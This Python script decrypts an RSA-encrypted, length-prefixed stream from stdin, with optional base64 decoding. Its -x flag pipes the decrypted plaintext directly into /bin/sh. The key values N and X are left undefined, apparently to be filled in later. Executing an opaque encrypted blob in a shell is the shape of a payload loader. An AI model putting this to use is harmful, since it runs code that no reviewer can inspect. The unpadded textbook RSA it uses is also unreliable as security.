#!/usr/bin/python
from binascii import hexlify
from struct import pack


def bytes2int(raw_bytes):
    # type: (bytes) -> int
    return int(hexlify(raw_bytes), 16)


def int2bytes(n):
    # type: (int) -> bytes
    if n < 0:
        raise ValueError("Negative numbers cannot be used: %i" % n)
    elif n == 0:
        return b"\x00"
    a = []
    while n > 0:
        a.append(pack("B", n & 0xFF))
        n >>= 8
    a.reverse()
    return b"".join(a)


def decrypt(crypto, n, d):
    return int2bytes(pow(bytes2int(crypto), d, n))


def decode_stream(src):
    b = src.read(1)
    if b:
        shift = result = 0
        while 1:
            i = ord(b)
            result |= (i & 0x7F) << shift
            if not (i & 0x80):
                break
            shift += 7
            b = src.read(1)
        return result
    else:
        return -1


def vdecrypt(n, d, src, out, i=0):
    from io import BytesIO

    s = decode_stream(src)
    while s > 0:
        cypher = src.read(s)
        blob = decrypt(cypher, n, d)
        # print('D', i, s, len(blob))
        b = BytesIO(blob)
        salt = decode_stream(b)
        index = decode_stream(b)
        block = b.read()
        assert index == i
        assert salt != 0
        out.write(block)
        i += 1
        s = decode_stream(src)


def decode_base64_source(src, n=None):
    from base64 import b64decode, standard_b64decode

    """Get a stream of decoded bytes from an iterable of base 64 bytes."""
    # https://stackoverflow.com/questions/55483846/python-stream-decode-base64-to-valid-utf8

    unprocessed = b""
    if not n:
        import io

        n = io.DEFAULT_BUFFER_SIZE
    chunk = src.read(n)

    while chunk:
        unprocessed += chunk.replace(b"\n", b"")

        safe_len = (len(unprocessed) // 4) * 4

        to_process, unprocessed = unprocessed[:safe_len], unprocessed[safe_len:]
        # print(len(to_process), len(unprocessed) , len(chunk) , safe_len)
        # missing_padding = len(data) % 4

        if to_process:
            yield b64decode(to_process)
        chunk = src.read(n)

    if unprocessed:
        yield b64decode(unprocessed + b"====")


if __name__ == "__main__":
    from sys import stdin, stdout, argv

    r, w = stdin.buffer, stdout.buffer
    if len(argv) > 1:
        if "-b" in argv:
            from io import RawIOBase, BufferedReader

            class IterStream(RawIOBase):
                def __init__(self, iterable):
                    self.leftover = b""
                    self.iterable = iterable

                def readable(self):
                    return True

                def readinto(self, b):
                    n = len(b)  # We're supposed to return at most this much
                    try:
                        chunk = self.leftover or next(self.iterable)
                    except StopIteration:
                        return 0  # indicate EOF
                    output, self.leftover = chunk[:n], chunk[n:]
                    b[: len(output)] = output
                    return len(output)

            r = BufferedReader(IterStream(decode_base64_source(r)))
        if "-x" in argv:
            from subprocess import Popen, PIPE

            p = Popen("/bin/sh", stdin=PIPE)
            w = p.stdin
    with r, w:
        vdecrypt(N, X, r, w)  # noqa: F821 # undefined name
